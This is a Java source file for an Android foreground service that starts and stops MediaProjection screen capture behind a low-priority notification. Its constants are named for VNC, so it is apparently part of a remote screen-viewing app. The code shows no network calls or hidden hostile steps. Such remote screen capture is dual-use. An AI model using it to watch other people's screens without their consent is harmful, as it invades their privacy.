package com.service.app;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;

import androidx.annotation.Nullable;
import androidx.core.app.NotificationCompat;
import androidx.localbroadcastmanager.content.LocalBroadcastManager;

import com.service.app.R;
import com.service.app.Services.utils;

public class CaptureService extends Service {
    public static final String ACTION_START_CAPTURE = "com.app.START_CAPTURE";
    private static final int NOTIFICATION_ID = 1;
    public static final String ACTION_STOP_CAPTURE = "com.app.STOP_CAPTURE";

    utils utl = new utils();
    defines consts = new defines();

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (ACTION_START_CAPTURE.equals(intent.getAction())) {
            startForeground(NOTIFICATION_ID, createNotification());
            Intent captureIntent = new Intent(this, CaptureActivity.class);
            captureIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TASK);
            startActivity(captureIntent);

        } else if (ACTION_STOP_CAPTURE.equals(intent.getAction())) {
            stopMediaProjection();
            new Handler(Looper.getMainLooper()).postDelayed(new Runnable() {
                @Override
                public void run() {
                    stopForeground(true);
                    stopSelf();
                }
            }, 2000);


        }
        return START_NOT_STICKY;
    }

    private void stopMediaProjection() {
        Intent stopIntent = new Intent("stop_mediaprojection");
        LocalBroadcastManager.getInstance(this).sendBroadcast(stopIntent);
    }



    private Notification createNotification() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                    "capture_channel",
                    "Capture",
                    NotificationManager.IMPORTANCE_LOW
            );
            getSystemService(NotificationManager.class).createNotificationChannel(channel);
        }

        NotificationCompat.Builder builder = new NotificationCompat.Builder(this, "capture_channel")
                .setContentTitle(consts.vnc_notify_title)
                .setContentText(consts.vnc_notify_text)
                .setSmallIcon(R.drawable.ic_launcher_foreground)
                .setPriority(NotificationCompat.PRIORITY_LOW);

        return builder.build();
    }
}
